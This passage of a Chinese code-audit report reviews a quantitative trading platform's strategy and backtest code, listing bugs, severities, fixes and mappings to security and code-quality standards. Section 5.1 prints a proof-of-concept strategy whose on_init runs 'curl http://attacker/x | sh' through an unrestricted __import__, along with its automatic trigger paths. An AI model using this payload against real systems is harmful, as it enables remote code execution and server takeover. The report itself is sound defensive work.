| modules/strategy/engines/strategy_manager.py:840-850 + models.py:39 | 回测实例 run_mode 默认 RunMode.LIVE，若 BacktestService 带 event_engine 构造，回测信号会经 _publish_signals 发布到实盘信号管线（当前后台线程路径 event_engine=None 恰好安全） | 待确认 | 回测模式显式置 BACKTEST 并禁止发布 |
| modules/strategy/services/training_service.py | SQL 拼接注入面 + 硬编码口令（子代理确认）；标签构造 N≥n 无标签、close=0 除零无防护（:119-124）；空样本/单类别测试集 ValueError（:208-264） | 高 | 参数化 SQL、移除硬编码凭证、标签构造与空样本防护 |
| modules/strategy/services/template_service.py | create/update/delete 模板方法缺 commit → 静默不生效 | 中 | 补 commit/rollback |
| modules/strategy/services/portfolio_service.py | 全文件 stub 不落库，组合业务闭环缺失 | 中 | 实现或删除 |
| modules/backtest/services/backtest_service.py:1252-1262 | 回测时把 DB allocated_capital 覆盖为 initial_capital（有注释说明，但改变用户配置语义） | 待确认 | 与产品确认期望行为 |
| modules/backtest/engines/backtest_engine.py:339-347 | run() 的 parameters 参数接收后从未使用（参数已在 load_strategy 时应用） | 低 | 删除或断言一致性 |
| modules/backtest/engines/optimization_engine.py:266-278 | 优化循环缺 settle_intraday_orders 且无 Sizer/价格兜底：close 模式订单次日按 open 成交（与主引擎当日 close 成交语义不一致）；price<=0 直接 submit 被 Broker 拒 | 中 | 对齐主引擎 settle + Sizer + 价格兜底 |
| modules/strategy/engines/strategy_manager.py:189-192、1637 | 回测/实盘两处 exec 沙箱注入的 `__name__` 进 builtins 字典的写法（`temp_module["__builtins__"]["__name__"]`）作用不可靠（`logging.getLogger(__name__)` 在策略模块级代码依赖其正确解析），且两处实现有细微差异（strategy_manager 兜底 logger 名不同） | 低 | 统一两处 exec 环境构建为公共函数 |
| stock_low_high_strategy.py:937、2003 | 信号 strategy_id=self.name 而非 context.strategy_id | 实盘按 UUID 关联时信号归属可能错乱（待确认框架是否覆写） | 中（待确认） | 统一用 context.strategy_id |
| high_vol_momentum_strategy.py:666/676/688、724 | 退出信号缺失致持仓脱节 | _make_exit_signal 返回 None 时 exit_pending 已加入 → _finalize_exits 删持仓但无卖出信号 → 与交易模块持仓记录脱节 | 中 | 无退出信号时回滚 exit_pending 或补偿卖出信号 |
| high_vol_momentum_strategy.py:288、622 | 风控不逐日运行 + regime 固化 | 止损检查耦合 rebalance_frequency，>1 时风控不逐日执行；is_bear 在买入时固化，regime 切换不更新旧持仓止损参数、不压缩持仓数 | 中 | 风控独立于调仓频率；按当前 regime 动态重算止损 |
| high_vol_momentum_strategy.py:756-762 | 异步任务引用丢失 | _fire_db 用 create_task 不持有引用，候选落库 task 可能被 GC 丢弃，候选静默丢失 | 中 | 保存 task 引用至实例并跟踪完成状态 |
| composite_service.py:178-188、529-590、596-606 | 组合闭环多处失真 | add_strategy 权重缩放总和<1 不补足；净值快照收益未剔除出入金且仅 rebalance 日写入；_was_triggered_today 按 created_at 去重对历史回放误判 | 中 | 权重归一化、出入金调整、按交易日去重 |
| lifecycle_manager.py:80-91、391 | 生命周期注册/恢复缺陷 | register_strategy 传 on_state_change 回调即 KeyError；ERROR 态无恢复路径（死代码：LifecycleEvent/on_starting 回调/READY 状态） | 中 | 修复回调注册、增加 ERROR→STOPPED 恢复 |
| bottom_strategy.py:108-113、517-518 | 模型加载静默回退 | 找不到模型仅 warning 后 return，无模型时静默跳过预测（空转策略，无显式降级提示） | 低 | 显式降级状态并通知用户 |
| stock_low_high_strategy.py:873-893 + backtest_broker.py:557-564 | 同日"清仓 A+买入 B"依赖卖出资金提前释放才不因现金不足被拒 | 与 A 股真实"卖出资金 T+1 可用"存在近似偏差 | 低 | 按真实 T+1 资金可用性重审同日换仓 |

### 5.1 exec 沙箱 RCE 利用示例（§5-1 补充证据）

```python
# 通过 Web 编辑器在 strategies.code 中保存以下代码，启动/重启策略即触发：
from modules.strategy.strategies.base.base_strategy import BaseStrategy
class EvilStrategy(BaseStrategy):
    def on_init(self):
        __import__("os").system("curl http://attacker/x | sh")  # __import__ 未被移除
    def on_bar(self, bar): return []
```
- 触发路径 1：`StrategyManager._recover_running_strategies`（strategy_manager.py:1992-2062）——服务启动时对 DB 中所有 status='running' 的策略自动 `load_strategy → _load_strategy_class_from_code → exec`（:249-250），无需任何用户交互。
- 触发路径 2：回测任务执行 `BacktestService._load_strategy_class` 路径 B（backtest_service.py:1646）——任意用户对自己可编辑的策略发起回测即执行其代码。
- 缓解建议：① 从 builtins 移除 `__import__` 并把 `import` 语句经 AST 白名单改写为受限导入；② exec 在独立低权限子进程/容器执行并切断网络与 DB 凭证；③ 策略代码保存/变更需管理员审批；④ 禁止在服务启动路径自动 exec 未审批代码。

## 6. 严重度汇总表（Top 20）

| # | 严重度 | 维度 | 位置 | 问题摘要 | 修复方案摘要 |
| --- | --- | --- | --- | --- | --- |
| 1 | 高 | 安全 | modules/strategy/engines/strategy_manager.py:183-199 | exec"沙箱"保留 __import__ 可 RCE，启动时自动执行 DB 代码 | 移除 __import__/受限 import + 代码审批 |
| 2 | 高 | 业务 | modules/strategy/engines/performance_tracker.py:83 | 每日绩效恒写 total_assets=0 → -100% 幽灵绩效 | 传入真实总资产 |
| 3 | 高 | 业务 | modules/backtest/engines/optimization_engine.py:199-211 | 参数优化 objective 恒 -inf，结果无意义 | 注册策略类到优化引擎 |
| 4 | 高 | 业务 | modules/backtest/engines/backtest_engine.py:415-421 | 任务级佣金/滑点配置被忽略（注入 broker 时） | run 前覆盖 broker.config |
| 5 | 高 | 边界 | modules/backtest/engines/backtest_broker.py:1266-1277 | 同日两笔卖出超卖，第二笔无持仓校验，现金虚增 | 成交时持仓数量校验 |
| 6 | 高 | 边界 | stock_low_high_strategy.py:1207-1211 | NaN 污染账本，回撤保护永久失效 | isfinite 过滤 |
| 7 | 高 | 边界 | bottom_strategy.py:636、659 | entry=0/NaN 除零/比较恒 False，持仓永不退出 | 价格守卫 + NaN 防护 |
| 8 | 高 | 业务 | modules/strategy/handlers.py:584-613 | 策略绩效接口恒返回全 0（metrics 键不匹配） | 读扁平指标键 |
| 9 | 高 | 业务 | backtest_service.py:379-394 vs 1283 | 版本快照记录但执行用当前代码，回测不可复现；实盘信号 strategy_version_id 恒 ""（strategy_manager.py:861/911 的 current_version_id 无赋值点） | 执行时读快照代码；启动时注入 current_version_id |
| 10 | 高 | 业务 | models.py:99 + sizer.py:209-218 | 裸信号按 100% 资金买入；FixedAmountSizer 不可达 | weight 默认 None |
| 11 | 高 | 业务 | GlobalRotationV2AggressiveStrategy.py:607-608 | 入场 quantity=0 伪值，实盘拒单/回测可成交 | 数量计算对齐实盘 |
| 12 | 高 | 边界 | bottom_strategy.py:525 | 重启后持仓风控失效（_position_entry 未恢复） | 恢复时同步入场追踪 |
| 13 | 高 | 安全 | modules/strategy/services/training_service.py | SQL 注入 + 硬编码口令 | 参数化 + 清理凭证 |
| 14 | 高 | 性能 | optimizers/grid_search.py:56-59 | 无上限并发 + 共享 session/策略实例竞态 | 限并发 + 独立实例 |
| 15 | 中 | 边界 | backtest_broker.py:313-332 | T+1 可卖校验缺失（close/trigger 当日卖出当日买入股） | available_quantity 校验 |
| 16 | 中 | 边界 | backtest_engine.py:505-512 | manager=None 时 UnboundLocalError | 初始化 signals=[] |
| 17 | 中 | 业务 | backtest_engine.py:611-612 | 自动创建 broker 时风控违规明细丢失 | 用局部 broker 收集 |
| 18 | 中 | 业务 | models.py:129-160 | 信号 order_mode/trigger_price/weight 序列化丢失 | 补 to_dict 字段 |
| 19 | 中 | 边界 | stock_low_high_strategy.py:1067 | CSI500 除零中断当日调仓 | 分母守卫 + try |
| 20 | 中 | 性能 | stock_low_high_strategy.py:1952-1957 | _data_cache 逐日 concat O(n²) | list 追加再构建 |

## 7. 已验证无问题项（健康点，供回归参考）

以下项目经逐文件核对与 grep 交叉验证，**未发现缺陷**，作为本审查的反向结论：

1. **前视泄露**：`modules/strategy/` 与 `modules/backtest/` 全量 grep 无 `shift(-1)`/`iloc[i+1]`/`loc[i+1]` 类未来引用（仅 data 模块研究任务存在，不在本范围）。
2. **ATR 除零**：`high_vol_momentum_strategy.py:654-658`（`atr<=0` 跳过止损判定）与 `:957-961` 已有防护，覆盖其全部 ATR 使用点（:466、:711、:664/674 均在其后或同守卫内）。
3. **撮合时序**：`backtest_engine.py:501-549` 的 match→bar→submit→settle→mtm 顺序正确，信号默认 T+1 成交，无"当日信号当日开盘成交"。
4. **资金三层防护**：Broker 层 `submit_order`（`_validate_order:313-332` + 数量缩减 `:513-530`）→ 撮合层 `_execute_fill` 实际资金校验与缩减/取消（`:741-779`）→ 卖出提前释放与 `_early_released_cash` 净额对冲（`:557-567`、`:782-790`、`mark_to_market:974-981`），三层闭环完整（唯 T+1 可卖校验与同日双卖见 §3-1/§3-2）。
5. **回测区间无数据**：`backtest_engine.py:460-462` 返回空结果而非崩溃；`data_feed_engine.py:454-456` 空 DataFrame 安全短路。
6. **结果持久化 JSON 兼容**：`BacktestResult._sanitize_float/_sanitize_json`（`backtest_engine.py:201-221`）对 NaN/Inf 有兜底，避免 JSONB 写入失败。
7. **取消链路**：`cancel_backtest_task` → `_cancel_event` → `raise asyncio.CancelledError`（`backtest_service.py:1386-1388`、`backtest_engine.py:492-495`），finally 关闭会话，链路完整。
8. **交易方向标准化**：`backtest_broker.py:381-393` 统一 BUY/SELL/LONG/SHORT/CLOSE_* → LONG/SHORT，与 Sizer、FIFO 配对（`backtest_engine.py:1726-1811`）一致。

## 8. 修复优先级建议（落地顺序）

1. **P0（安全/资金安全，一周内）**：exec 沙箱 RCE（§5-1）、绩效 -100% 幽灵写入（§5-2）、同日双卖超卖（§3-2）、T+1 可卖校验（§3-1）、参数优化恒 -inf（§5-3）。
2. **P1（结果可信度，两周内）**：费率配置失效（§5-4）、版本快照未用于执行（§5-8）、绩效接口恒 0（§5-7）、weight 默认 1.0 满仓（§5-9）、各策略 NaN/除零防护（§3-3/4/5/6/7）。
3. **P2（健壮性与性能，一个月内）**：止损 trigger_price 补齐、重启状态恢复、_data_cache O(n²) 改造、grid 搜索限并发、死代码清理（§2）。

> 说明：本报告所有发现均基于静态代码审查与 grep 交叉验证；标注"待确认"的条目（§3-10、§5-18、§5-23 等）需运行态验证或产品确认。审查未修改任何业务代码，仅生成本报告。

## 9. 业界标准对照（判定依据映射）

> 本节把前文 §2-§5 的发现映射到业界公认审查标准，作为每条判定的"依据标准"溯源。标准缩写：
> **QT**＝量化回测业界规范（对照 vectorbt / backtrader / zipline：撮合真实性、前视偏差防护、交易成本、账户一致性）；
> **SEC**＝安全规范（OWASP Top 10、CWE、最小权限原则）；
> **GR**＝Google Code Review 规范 / Code Health（可维护性、可读性、无死代码、可测试性）；
> **CC**＝Clean Code（命名、函数规模、职责单一、防御式编程）；
> **SOLID**＝单一职责 / 开闭 / 里氏替换 / 接口隔离 / 依赖倒置；
> **RF**＝Martin Fowler《重构》坏味道清单（Long Method、Duplicated Code、Dead Code、Speculative Generality、Magic Number、Inconsistent Naming 等）；
> **P8**＝PEP 8（Python 风格规范）；
> **EP**＝Effective Python（防御式编程、显式优于隐式、异常处理、切片边界等）。

### 9.1 量化回测业界规范（QT）

| 位置 | 发现摘要 | 依据标准条款 | 依据：标准 — 细则 |
| --- | --- | --- | --- |
| backtest_broker.py:313-332、1266-1277 | 卖出校验用总持仓非可卖量；同日双卖第二笔无持仓校验 | 撮合真实性 / 账户一致性 | 依据：QT — T+1 可卖校验与超卖防护（对照 zipline TradingCalendar / 真实券商 T+1 拒绝） |
| backtest_broker.py:1247-1259 | T+1 解锁逻辑正确（买入 T+1 成交、T+2 可卖） | 撮合真实性 | 依据：QT — T+1 制度（健康点，§7-3） |
| backtest_broker.py:1279-1328 | 涨跌停识别（主板/科创/ST） | 撮合真实性 | 依据：QT — 涨跌停限制（对照 backtrader 无内建，超出同业） |
| backtest_broker.py:880-885 | trigger 止损单跳过涨跌停门 | 撮合真实性近似 | 依据：QT — 需在报告中披露近似，建议按真实涨跌停挂单排队 |
| BacktestBrokerConfig:195 vs 30-31 | min_commission=0.0 与"最低 5 元"文档矛盾 | 交易成本真实性 | 依据：QT — 费用模型须与真实佣金结构一致（对照 vectorbt FFM） |
| backtest_engine.py:501-549 | 撮合时序 match→bar→submit→settle→mtm，信号 T+1 成交 | 前视偏差防护 | 依据：QT — 无前视（健康点，§7-3）；决策时戳 ≥ 成交时戳 |
| GlobalRotationV2:158-183 | 回测中 DB 预热加载至真实今天 | 前视偏差防护 | 依据：QT — 数据按 as-of 切片，禁未来数据（§3-10，待确认） |
| bottom_strategy.py:263-291 | 因子全量预载，可能由复权价事后重算 | 前视偏差防护（数据源级） | 依据：QT — 因子须按当时可得信息计算（§1 风险点 2，待确认） |
| backtest_broker.py:631-648 | 停牌挂单保留 + 20 日过期 | 撮合真实性 | 依据：QT — 停牌不可成交（对照 zipline 数据对齐） |
| backtest_engine.py:460-462 | 回测区间无数据返回空结果 | 边界健壮性 | 依据：QT — 数据区间校验 |
| backtest_engine.py:339-347 | run() parameters 参数未使用 | 接口清晰性 | 依据：QT/GR — 未用参数属接口噪声 |

### 9.2 安全规范（SEC）

| 位置 | 发现摘要 | 依据标准条款 | 依据：标准 — 细则 |
| --- | --- | --- | --- |
| strategy_manager.py:183-199、backtest_service.py:1631-1637 | exec 沙箱保留 __import__ 可 RCE，启动自动执行 DB 代码 | 危险代码执行 / 注入 | 依据：SEC — OWASP A03 注入与"不可信输入不得进入执行上下文"；最小权限原则；CWE-95（不安全反序列化/动态代码执行） |
| training_service.py | SQL 字符串拼接 + 硬编码口令 | SQL 注入 / 凭证管理 | 依据：SEC — OWASP A03（SQL 注入，参数化查询）；CWE-798（硬编码凭证） |
| strategy_service.py:681-703 | import 白名单仅"警告不阻断"，无实际执行拦截 | 纵深防御 | 依据：SEC — 白名单校验不能替代运行时隔离（仅作为第一道提示） |
| strategy_manager.py:840-850 | 回测信号可能发布到实盘事件链（待确认） | 环境隔离 | 依据：SEC — 回测/实盘数据隔离（防止回测信号污染实盘信号库） |

### 9.3 Google Code Review / Code Health（GR）

| 位置 | 发现摘要 | 依据标准条款 | 依据：标准 — 细则 |
| --- | --- | --- | --- |
| §2 死代码清单（26 项） | strategy_loader、BacktestTask/OptimizationTask、SimulationEngine、ReportEngine、旧接口兼容层等未使用代码 | Code Health：无死代码 | 依据：GR — "删除未使用的代码，不保留注释掉的/推测性代码"，减少认知负担与维护面 |
| strategy_manager.py:109-228 vs backtest_service.py:1570-1701 | 两处 exec 沙箱环境构建逻辑重复 | Code Health：无重复 | 依据：GR/DRY — 重复逻辑必须抽取共享函数，避免两处漂移（已有 __name__ 注入等细微差异） |
| strategy_manager.py:1389-1397 vs data_feed_engine.py:84-104 | 两处 _is_etf 判定规则不一致 | Code Health：单一事实来源 | 依据：GR — 同一领域规则只能有一处定义 |
| strategy_manager.py:589-737、backtest_engine.py:689-926 | handle_bar_batch / run_composite 巨型函数 | Code Health：可读性 | 依据：GR — 函数应小且只做一件事，便于 review 与测试 |
| strategy_manager.py:716-717、optimization_engine.py:249-250 | except Exception 静默吞异常 | Code Health：错误可见性 | 依据：GR — 吞异常须记录并限制范围，防止静默失效 |
| 全模块 | 测试覆盖缺失（grep 无策略/回测引擎单测引用） | Code Health：可测试性 | 依据：GR — 关键路径（撮合/资金/信号链路）必须有测试保护 |

### 9.4 Clean Code / SOLID

| 位置 | 发现摘要 | 依据标准条款 | 依据：标准 — 细则 |
| --- | --- | --- | --- |
| strategy_manager.py | 单一类承担加载/运行/预热/恢复/信号发布/持仓同步/状态持久化 | 单一职责 SRP | 依据：SOLID — SRP：一个类只应有一个变更理由；建议拆分为 StrategyLoader/Runner/StateSaver |
| engine_factory.py:49-127 | 注册表恒空，create_engine 恒回退 | 开闭原则 OCP 误用 | 依据：SOLID — 保留无用抽象属 Speculative Generality（见 RF）；或明确删除 |
| strategy_manager.py:971-985 | update_strategy_capital 直接覆盖 total_assets 语义不清 | 显式优于隐式 | 依据：CC — 方法名与行为必须一致，避免隐式副作用 |
| strategy_manager.py:615-622、639-643 | 策略类型名 'BottomStrategy' in type().__name__ 字符串匹配 | 开闭原则 OCP | 依据：SOLID/CC — 用 isinstance/注册元信息替代硬编码类名字符串，新增策略无需改管理器 |
| backtest_broker.py:79-176 | BrokerOrder/BrokerPosition/AccountSnapshot 数据类职责清晰 | 数据与行为分离 | 依据：CC — 数据类纯数据（健康点） |

### 9.5 Martin Fowler《重构》坏味道（RF）

| 位置 | 发现摘要 | 坏味道 | 依据：标准 — 细则 |
| --- | --- | --- | --- |
| strategy_manager.py:589-737、1091-1241、backtest_engine.py:689-926、optimization_engine.py:196-312 | 多个 150-300 行大函数 | Long Method | 依据：RF — 长函数需按"提取函数"（Extract Function）拆分为意图清晰的子步骤 |
| strategy_manager.py:109-228 vs backtest_service.py:1570-1701；两处 _is_etf；两处在线复权（strategy_manager.py:1399-1462 vs data_feed 相关查询）；backtest_engine.py:514-518 vs 854-859 方向归一化 | 重复逻辑四处以上 | Duplicated Code | 依据：RF — 重复代码合并为单一函数（Extract Function/Extract Module），消除漂移风险 |
| §2 全部 | 未使用类/方法/分支/常量 | Dead Code | 依据：RF — 删除死代码（Safe Delete），Git 历史可恢复 |
| engine_factory.py、SimulationEngine、ReportEngine、BacktestTask/OptimizationTask、constants.py:223-230 | 为"将来可能"保留的抽象与枚举 | Speculative Generality | 依据：RF — 只实现当前需要的抽象（YAGNI） |
| sizer.py:121（0.9984 费用缓冲）、backtest_service.py:1353-1367（1000 只兜底）、backtest_broker.py:632-633（20 日过期） | 魔法数字散落 | Magic Number | 依据：RF — 提取为具名常量/配置项并注释推导 |
| models.py:99 weight 默认 1.0 引发 Sizer 行为歧义 | 隐式默认值造成两套解释 | Inconsistent/隐式行为 | 依据：RF/EP — 消除歧义默认值，显式声明意图 |
| strategy_service.py:51-60 _get_strategy_defaults 遍历 registry._registry 私有成员 | 访问他人私有结构 | 破坏封装（Inappropriate Intimacy） | 依据：RF — 通过公开 API（registry.list_all/get_first）访问 |
| backtest_broker.py:1266-1277 卖出分支对已删持仓无感知 | 分支隐含状态假设 | Shotgun Surgery / 隐藏状态 | 依据：RF — 状态变更应集中在持仓维护方法内 |

### 9.6 PEP 8 / Effective Python（P8 / EP）

| 位置 | 发现摘要 | 依据标准条款 | 依据：标准 — 细则 |
| --- | --- | --- | --- |
| strategy_service.py:705-706 | 重复 @staticmethod 装饰器 | 风格错误 | 依据：P8 — 冗余装饰器应删除（虽合法但属噪声） |
| handlers.py:514-515 | return 后重复语句 | 死代码/风格 | 依据：P8/GR — 不可达语句应删除 |
| backtest_engine.py:196 | to_dict 缩进错位 | 缩进一致性 | 依据：P8 — 统一 4 空格缩进，避免 tab/空格混用 |
| stock_low_high_strategy.py:1067、1207-1211；bottom_strategy.py:636/659 | 除零与 NaN 未防御 | 防御式编程 | 依据：EP（Item：防御式编程/边界先行）— 数学运算前校验分母与有限值（math.isfinite） |
| high_vol_momentum_strategy.py:607 | int(NaN) 抛异常丢当日信号 | 防御式编程 | 依据：EP — 数据进入数值运算前清洗 |
| models.py:99 + sizer.py:209-218 | weight 默认 1.0 隐式满仓 | 显式优于隐式 | 依据：EP — "显式优于隐式"（Explicit over Implicit），默认值不应隐藏行为 |
| strategy_manager.py:716-717、optimization_engine.py:249-250 | 宽泛 except 吞异常 | 异常处理 | 依据：EP — 只捕获预期异常，宽 except 至少记录并 re-raise 边界 |
| GlobalRotationV2:158-183 | 回测加载真实今天数据依赖守卫 | 数据边界 | 依据：EP — 数据切片边界显式化，禁隐式未来值 |
| strategy_manager.py:1914-1929 | _get_missed_trading_days 用 weekday 近似交易日 | 语义正确性 | 依据：EP/GR — 用真实交易日历替换近似实现并加注释 |

### 9.7 标准引用清单（供复核）

| 标准 | 代表条款 | 本报告中主要映射条目 |
| --- | --- | --- |
| 量化回测规范 QT | 撮合真实性、前视防护、费用真实性、账户一致性 | §1、§3-1/2/10、§7 |
| 安全 SEC | OWASP A03 注入、CWE-95/798、最小权限 | §5-1、§5-19、§5-18 |
| Google Code Review GR | Code Health：无死代码、可读性、可测试性 | §2 全部、§5-16 |
| Clean Code CC | 命名、小函数、显式行为 | §5-17、§5-10 |
| SOLID | SRP/OCP/DIP | §5 引擎职责、§5-15 |
| Fowler 坏味道 RF | Long Method、Duplicated Code、Dead Code、Magic Number、Speculative Generality | §2、§4、§5 |
| PEP 8 P8 | 缩进、冗余语句 | §2-19、§6 附注 |
| Effective Python EP | 防御式编程、显式优于隐式、异常处理 | §3-3/4/5/6/7、§5-10 |

> 以上对照将前文每条实证发现与业界标准建立一一对应，作为问题优先级（§8）与修复方案（各表"修复建议"列）的判定依据；后续修复时可在 PR 描述中引用对应标准条款。
